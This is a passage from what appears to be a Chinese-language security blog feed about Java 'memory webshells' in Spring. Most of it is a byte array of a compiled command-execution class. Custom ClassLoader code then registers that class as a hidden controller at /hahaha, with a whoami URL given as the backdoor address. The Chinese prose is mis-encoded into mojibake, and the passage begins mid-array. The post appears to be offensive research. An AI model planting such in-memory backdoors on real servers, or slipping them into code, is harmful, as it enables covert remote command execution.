class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">121</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">67</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">68</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">78</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">119</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">69</span>, <span class="number">114</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">40</span>, <span class="number">73</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">121</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">77</span>, <span class="number">43</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">44</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">45</span>, -<span class="number">58</span>, <span class="number">0</span>, -<span class="number">109</span>, <span class="number">18</span>, <span class="number">5</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">6</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">9</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">10</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">33</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">89</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">83</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">58</span>, <span class="number">6</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">30</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">89</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">83</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">58</span>, <span class="number">6</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">19</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">20</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">22</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">58</span>, <span class="number">7</span>, <span class="number">25</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">24</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">25</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">25</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">25</span>, <span class="number">4</span>, <span class="number">25</span>, <span class="number">5</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">29</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">44</span>, <span class="number">17</span>, <span class="number">1</span>, -<span class="number">12</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">2</span>, <span class="number">0</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">78</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">82</span>, <span class="number">0</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, -<span class="number">116</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, -<span class="number">111</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, -<span class="number">104</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, -<span class="number">99</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, -<span class="number">94</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, -<span class="number">91</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, -<span class="number">82</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, -<span class="number">78</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, -<span class="number">119</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, -<span class="number">91</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, -<span class="number">99</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">77</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">77</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">77</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="string">&quot;org.m0d9.sec.SpringDemo.SSOLogin&quot;</span>,</span><br><span class="line">                    classData, <span class="number">0</span>, classData.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">ClassLoader parentClassLoader = MyClassLoader.class.getClassLoader();</span><br><span class="line">MyClassLoader classLoader = <span class="keyword">new</span> MyClassLoader(parentClassLoader);</span><br><span class="line">Class myObjectClass = classLoader.loadClass(<span class="string">&quot;reflection.MyObject&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//            WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span></span><br><span class="line"><span class="comment">//        WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span></span><br><span class="line"><span class="comment">//        WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span></span><br><span class="line">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ bean</span></span><br><span class="line">RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"><span class="comment">// 2. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­å”¯ä¸€çš„ Method å¯¹è±¡</span></span><br><span class="line"><span class="comment">//            Method method = (Class.forName(&quot;org.m0d9.sec.SpringDemo.SSOLogin&quot;).getDeclaredMethods())[0];</span></span><br><span class="line">Method method = myObjectClass.getDeclaredMethods()[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// 3. å®šä¹‰è®¿é—® controller çš„ URL åœ°å€</span></span><br><span class="line">PatternsRequestCondition url = <span class="keyword">new</span> PatternsRequestCondition(<span class="string">&quot;/hahaha&quot;</span>);</span><br><span class="line"><span class="comment">// 4. å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰</span></span><br><span class="line">RequestMethodsRequestCondition ms = <span class="keyword">new</span> RequestMethodsRequestCondition();</span><br><span class="line"><span class="comment">// 5. åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller</span></span><br><span class="line">RequestMappingInfo info = <span class="keyword">new</span> RequestMappingInfo(url, ms, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"><span class="comment">//            r.registerMapping(info, Class.forName(&quot;org.m0d9.sec.SpringDemo.SSOLogin&quot;).newInstance(), method);</span></span><br><span class="line">r.registerMapping(info, myObjectClass.newInstance(), method);</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¹‹åå¯ä»¥çœ‹åˆ°registryå·²ç»æ·»åŠ æˆåŠŸ</p><p><img src="/images/pasted-113.png" alt="upload successful"></p><p><a href="http://localhost:8080/hahaha?code=whoami">http://localhost:8080/hahaha?code=whoami</a> ä¸ºåé—¨åœ°å€</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å¤§åŒå°å¼‚ï¼Œå…¶å®éƒ½æ˜¯æ‰¾åˆ°ä¸Šä¸‹æ–‡ï¼Œæ‰§è¡Œæ¶æ„çš„codeæ·»åŠ urlæ˜ å°„åŠå…¶å¯¹åº”ä»£ç ã€‚ä¸è¿‡æ‰¾åˆ°è¿™äº›å…³é”®ç±»ï¼Œè¿˜æ˜¯éœ€è¦å¯¹æ¡†æ¶çš„ä¸€å®šç†è§£ã€‚</p><p>è¿™ä¸¤ç¯‡æ–‡ç« ä¸­ï¼Œéƒ½æ²¡æœ‰æåˆ°åœ¨å®é™…åœºæ™¯ä¸‹ï¼Œæ¯”å¦‚ååºåˆ—åŒ–/fastjsonç­‰æ¼æ´ä¸­ï¼Œå¦‚ä½•è¿è¡Œè¿™äº›evil codeï¼Œç•™å¾…ä¸‹ç¯‡æ€»ç»“è§£é‡Šã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://www.anquanke.com/post/id/198886">åŸºäºå†…å­˜ Webshell çš„æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ç ”ç©¶</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;å‰æ–‡tomcatçš„é€šç”¨servletå†…å­˜é©¬å·²ç»åŸºæœ¬å¯ä»¥è¦†ç›–å¤§éƒ¨åˆ†çš„æƒ…å†µï¼Œé’ˆå¯¹ç¬¬ä¸‰æ–¹æ¡†æ¶ï¼Œæ€è·¯ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå§¿åŠ¿ä¸åŒã€‚è§‚æ˜Ÿå®éªŒå®¤çš„å¸ˆå‚…ä»¬åœ¨å‚è€ƒã€1ã€‘ä¸­æåˆ°äº†å…³äºSpingçš„å§¿åŠ¿ï¼Œè¿™é‡Œå­¦ä¹ è®°å½•ä¸‹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;Spring&quot;&gt;&lt;a href=&quot;#Spring&quot; class=&quot;headerlink&quot; title=&quot;Spring&quot;&gt;&lt;/a&gt;Spring&lt;/h2&gt;&lt;p&gt;å…·ä½“çš„èƒŒæ™¯ä¸èµ˜è¿°ï¼Œè¯¦è§å‚è€ƒã€1ã€‘ï¼Œå‡ ä¸ªé‡ç‚¹çš„æ­¥éª¤&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è·å¾—å½“å‰ä»£ç è¿è¡Œæ—¶çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ&lt;/li&gt;
&lt;li&gt;æ‰‹åŠ¨æ³¨å†Œ controller&lt;/li&gt;
&lt;li&gt;controller ä¸­çš„ Webshell é€»è¾‘&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æ–‡ä¸­å¸ˆå‚…æ²¡æœ‰ç»™å‡ºç›´æ¥è¿è¡Œçš„pocï¼Œè¿™é‡Œç»™ä¸€ä¸‹&lt;/p&gt;
&lt;h3 id=&quot;Show-me-the-code&quot;&gt;&lt;a href=&quot;#Show-me-the-code&quot; class=&quot;headerlink&quot; title=&quot;Show me the code&quot;&gt;&lt;/a&gt;Show me the code&lt;/h3&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="å†…å­˜é©¬" scheme="http://m0d9.me/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    <category term="Spring" scheme="http://m0d9.me/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>Javaå†…å­˜shellï¼šjavaagent</title>
    <link href="http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9Ajavaagent/"/>
    <id>http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9Ajavaagent/</id>
    <published>2020-09-27T02:05:00.000Z</published>
    <updated>2020-10-27T03:03:24.833Z</updated>
    
